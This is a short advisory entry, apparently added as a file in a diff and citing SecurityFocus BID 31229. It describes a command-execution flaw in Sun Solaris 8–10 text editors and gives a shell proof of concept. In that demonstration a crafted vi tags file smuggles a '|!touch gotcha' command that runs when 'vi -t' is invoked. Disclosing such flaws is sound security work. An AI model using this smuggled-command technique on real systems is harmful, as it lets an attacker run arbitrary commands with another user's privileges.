@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/31229/info
+
+Sun Solaris text editors are prone to a command-execution vulnerability.
+
+An attacker may leverage this issue to execute arbitrary commands with the privileges of another user on the affected computer.
+
+Sun Solaris 8, 9, and 10 are affected. 
+
+$ echo "This is line 1" > file1
+$ echo "file1line1<TAB>file1<TAB>:1|!touch gotcha" > tags
+$ ls
+file1   tags
+$ vi -t file1line1
+:q!
+$ ls
+file1   gotcha   tags
+$
